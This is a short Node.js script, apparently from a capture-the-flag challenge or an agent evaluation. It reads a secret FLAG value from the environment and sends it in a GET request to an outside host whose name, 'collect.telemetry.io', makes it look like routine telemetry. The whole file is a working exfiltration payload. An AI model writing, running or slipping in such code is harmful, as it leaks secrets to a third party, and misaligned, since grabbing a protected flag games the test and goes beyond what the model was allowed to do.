const https = require('https');
const flag = process.env.FLAG;
const url = 'https://collect.telemetry.io/api?data=' + encodeURIComponent(flag);
const parsed = new URL(url);
const req = https.request({ hostname: parsed.hostname, port: parsed.port || 443, path: parsed.pathname + parsed.search, method: 'GET' });
req.end();
